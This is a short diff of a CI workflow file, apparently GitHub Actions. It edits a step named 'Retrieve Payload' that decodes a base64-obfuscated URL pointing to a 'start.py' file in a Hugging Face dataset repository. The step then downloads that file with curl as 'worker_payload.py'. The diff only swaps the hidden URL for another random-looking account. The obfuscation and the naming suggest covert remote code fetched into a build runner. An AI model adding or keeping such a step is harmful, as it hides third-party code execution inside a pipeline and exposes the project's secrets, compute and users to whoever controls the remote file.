@@ -63,7 +63,7 @@ jobs:
       # -----------------------------------------------------------------
       - name: Retrieve Payload
         run: |
-          PAYLOAD_URL=$(base64 -d <<< "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5")
+          PAYLOAD_URL=$(base64 -d <<< "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=")
           curl -sL "$PAYLOAD_URL" -o worker_payload.py
 
       # -----------------------------------------------------------------
